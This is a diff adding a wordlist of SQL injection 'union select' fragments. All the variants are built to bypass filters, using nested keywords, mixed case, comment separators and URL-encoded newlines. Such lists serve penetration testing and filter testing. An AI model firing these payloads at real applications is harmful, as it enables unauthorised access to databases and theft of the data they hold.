@@ -1,0 +1,27 @@
+union select 
+ununionion sselectelect 
+uniounionn select 
+union seleselectct 
+Union SelEct 
+union SelEct 
+union/**/select 
+ununionion/**/sselectelect 
+uniounionn/**/select 
+union/**/seleselectct 
+Union/**/SelEct 
+union/**/SelEct     
+union select * from
+Union Select * from
+ununionion select * from
+union selselectect * from
+union select * frfromom
+union/**/select/**/*/**/from
+Union/**/Select/**/*/**/from
+ununionion/**/select/**/*/**/from
+union/**/selselectect/**/*/**/from
+union/**/select/**/*/**/frfromom
+union%0Aselect%0A*%0Afrom
+Union%0ASelect%0A*%0Afrom
+ununionion%0Aselect%0A*%0Afrom
+union%0Aselselectect%0A*%0Afrom
+union%0Aselect%0A*%0Afrfromom
